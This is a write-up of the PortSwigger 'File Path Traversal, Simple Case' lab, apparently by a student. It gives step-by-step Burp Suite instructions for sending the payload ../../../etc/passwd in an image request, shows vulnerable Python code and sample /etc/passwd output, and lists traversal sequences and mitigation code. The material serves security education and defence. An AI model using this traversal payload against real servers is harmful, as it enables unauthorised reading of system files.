# 📘 PortSwigger Lab: File Path Traversal, Simple Case

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/path-traversal/reading-arbitrary-files-via-path-traversal/file-path-traversal/lab-simple  
> 🎯 Topic: Path Traversal — reading arbitrary files  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📁 What Is Path Traversal](#path-traversal)
- [🗂 How the Application Loads Images](#images)
- [❌ Vulnerable Logic](#vulnerable-flow)
- [🔍 Step 1 — Find the Image Request](#step1)
- [🔍 Step 2 — Send the Request to Repeater](#step2)
- [🔍 Step 3 — Identify the `filename` Parameter](#step3)
- [🔍 Step 4 — Replace the File Path](#step4)
- [🔍 Step 5 — Read `/etc/passwd`](#step5)
- [📨 Example HTTP Request](#request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧭 How `../` Works](#dotdot)
- [🐧 Why `/etc/passwd` Is Used](#passwd)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a **File Path Traversal** vulnerability in the product image display mechanism and retrieve the contents of:

```text
/etc/passwd
```

To solve the lab, modify the:

```text
filename
```

parameter and set it to:

```text
../../../etc/passwd
```

---

<a id="theory"></a>

## 🧠 Short Theory

**Path Traversal** is a vulnerability that allows user input to influence the path of a file read by the server.

The application expects a normal image name:

```text
filename=58.jpg
```

An attacker instead supplies:

```text
../
```

This sequence means:

```text
move to the parent directory
```

If the server does not validate the final path, the attacker can leave the image directory and request another file from the server's file system.

---

<a id="idea"></a>

## 🧩 Core Idea

Normal value:

```text
filename=58.jpg
```

Assume the application reads images from:

```text
/var/www/images/
```

The resulting path may be:

```text
/var/www/images/58.jpg
```

After replacing the parameter with:

```text
filename=../../../etc/passwd
```

the server constructs:

```text
/var/www/images/../../../etc/passwd
```

After path normalization, this resolves to:

```text
/etc/passwd
```

The server then returns that file in the HTTP response.

---

<a id="path-traversal"></a>

## 📁 What Is Path Traversal

Path Traversal is also known as:

```text
Directory Traversal
```

or:

```text
dot-dot-slash attack
```

The main sequence is:

```text
../
```

Its function is:

```text
move one directory upward
```

Example starting directory:

```text
/var/www/images/
```

After one `../`:

```text
/var/www/
```

After two:

```text
/var/
```

After three:

```text
/
```

The attacker can then reference:

```text
/etc/passwd
```

---

<a id="images"></a>

## 🗂 How the Application Loads Images

The lab contains a vulnerability in the product image display feature.

The browser loads a product page and then sends a separate request for the image.

A typical endpoint looks like:

```http
GET /image?filename=58.jpg
```

The parameter:

```text
filename
```

tells the server which file to read and return.

A secure application should allow access only to known files inside the image directory.

In this lab, the server trusts the parameter and accepts path components.

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Logic

Simplified vulnerable code may look like:

```python
filename = request.args["filename"]
path = "/var/www/images/" + filename

return open(path, "rb").read()
```

The problem is:

```text
filename is controlled by the client
```

and is directly appended to a server-side path.

With:

```text
../../../etc/passwd
```

the final path escapes the image directory.

A secure implementation must validate the canonical path and reject any path outside the approved base directory.

---

<a id="step1"></a>

## 🔍 Step 1 — Find the Image Request

Open the lab and visit any product page.

Run Burp Suite and inspect:

```text
Proxy → HTTP history
```

Find the request that retrieves the product image.

It normally looks similar to:

```http
GET /image?filename=58.jpg HTTP/2
```

The important element is:

```text
filename parameter
```

---

<a id="step2"></a>

## 🔍 Step 2 — Send the Request to Repeater

Right-click the request:

```text
Right click → Send to Repeater
```

Burp Repeater makes it possible to modify the request and send it repeatedly.

This is more convenient than manually editing the browser URL each time.

---

<a id="step3"></a>

## 🔍 Step 3 — Identify the `filename` Parameter

The original request may contain:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The value:

```text
filename=58.jpg
```

is controlled by the client.

This is the value that must be modified.

---

<a id="step4"></a>

## 🔍 Step 4 — Replace the File Path

Replace:

```text
58.jpg
```

with:

```text
../../../etc/passwd
```

The request becomes:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Click:

```text
Send
```

---

<a id="step5"></a>

## 🔍 Step 5 — Read `/etc/passwd`

The HTTP response now contains the contents of the system file.

Typical lines include:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

This proves that:

```text
the server read /etc/passwd
```

The lab is then marked:

```text
Solved
```

---

<a id="request"></a>

## 📨 Example HTTP Request

Original request:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Modified request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Critical value:

```text
../../../etc/passwd
```

---

<a id="response"></a>

## 📥 Example Result

Instead of binary image data, the response contains text such as:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

The exact file contents may vary.

The important proof is:

```text
the response contains data from /etc/passwd
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the lab
2. Visit a product page
3. Find the image request in Burp HTTP history
4. Identify the filename parameter
5. Send the request to Repeater
6. Replace the image name with ../../../etc/passwd
7. Send the request
8. Receive the contents of /etc/passwd
9. Confirm that the lab is solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The vulnerability resulted from three combined issues.

### 1. The user controls the file name

```text
filename=...
```

is supplied in the HTTP request.

### 2. The value is used as part of a file path

The server combines the image directory with the client-controlled value.

### 3. The final path is not validated

The application does not check whether the resolved file remains inside the allowed image directory.

Vulnerable flow:

```text
User input
    ↓
Concatenate with image directory
    ↓
Open resulting path
    ↓
Return file contents
```

---

<a id="dotdot"></a>

## 🧭 How `../` Works

The sequence:

```text
../
```

moves to the parent directory.

Example:

```text
/var/www/images/../../../etc/passwd
```

Normalization:

```text
/var/www/images/..
→ /var/www
```

```text
/var/www/..
→ /var
```

```text
/var/..
→ /
```

The remaining path is:

```text
/etc/passwd
```

The required number of `../` sequences depends on the depth of the original directory.

The working value in this lab is:

```text
../../../etc/passwd
```

---

<a id="passwd"></a>

## 🐧 Why `/etc/passwd` Is Used

`/etc/passwd` is a standard Linux/Unix file.

It is commonly readable by local processes and contains system account information.

Typical line format:

```text
username:x:UID:GID:comment:home:shell
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
```

Important distinction:

```text
/etc/passwd normally does not contain password hashes
```

Modern systems usually store password hashes separately, for example in `/etc/shadow`, which is more restricted.

The lab uses `/etc/passwd` as a safe proof of arbitrary file read.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

Whenever an application accepts a file name, path, or resource name, ask:

```text
Can I control the final file path?
```

Common parameter names:

```text
file
filename
path
document
template
page
image
download
folder
```

Testing process:

```text
1. Find a file-related parameter
2. Identify the expected value
3. Add ../
4. Try a relative or absolute path
5. Compare status, body, length, and Content-Type
6. Check whether another file is returned
```

Core principle:

```text
Do not trust the parameter name.
Test how the server actually uses its value.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Modifying the HTML page

The vulnerability is located in the separate image request.

Look for:

```http
GET /image?filename=...
```

### Mistake 2. Changing the wrong parameter

The target parameter is:

```text
filename
```

### Mistake 3. Using too few `../` sequences

One traversal sequence may not escape the image directory.

This lab uses:

```text
../../../etc/passwd
```

### Mistake 4. Adding an unnecessary leading slash

The simple solution uses the relative path:

```text
../../../etc/passwd
```

### Mistake 5. Expecting an image response

After exploitation, the response contains text from a system file rather than JPEG data.

### Mistake 6. Not sending the modified request

The changed value must actually be sent to the server.

### Mistake 7. Looking at the local file system

The file is read from the lab server, not from the attacker's machine.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept File Paths from the User

Prefer an identifier:

```text
image_id=58
```

and resolve the real path on the server.

### 2. Use an Allowlist

Permit only known file names.

Example:

```python
allowed = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 3. Extract the Basename

Path components may be removed:

```python
filename = os.path.basename(user_input)
```

This should not be the only security control.

### 4. Normalize and Validate the Path

Secure approach:

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))

if not target.startswith(base + os.sep):
    reject_request()
```

### 5. Apply Least Privilege

The web application process should have access only to the files it requires.

### 6. Avoid Detailed File-System Errors

Error messages should not reveal absolute paths or server directory structure.

### 7. Log Suspicious Sequences

Examples:

```text
../
..\
%2e%2e%2f
```

Logging can help detect traversal attempts, but it does not replace correct path validation.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Started Burp Proxy
- [ ] Located the image request
- [ ] Identified the `filename` parameter

### Testing

- [ ] Sent the request to Repeater
- [ ] Replaced the original image name
- [ ] Used `../../../etc/passwd`
- [ ] Sent the modified request

### Result

- [ ] The response contains lines from `/etc/passwd`
- [ ] Arbitrary file read is confirmed
- [ ] The lab is marked Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The application used the client-controlled:

```text
filename
```

parameter to construct an image path and did not verify that the resolved file remained inside the allowed directory.

The payload:

```text
../../../etc/passwd
```

moved upward through the directory structure and retrieved:

```text
/etc/passwd
```

Main lessons:

```text
User input must not be used directly as a file path.
```

```text
The normalized final path must remain inside the approved base directory.
```

```text
The ../ sequence moves to parent directories.
```

---

[⬆ Back to top](#top)
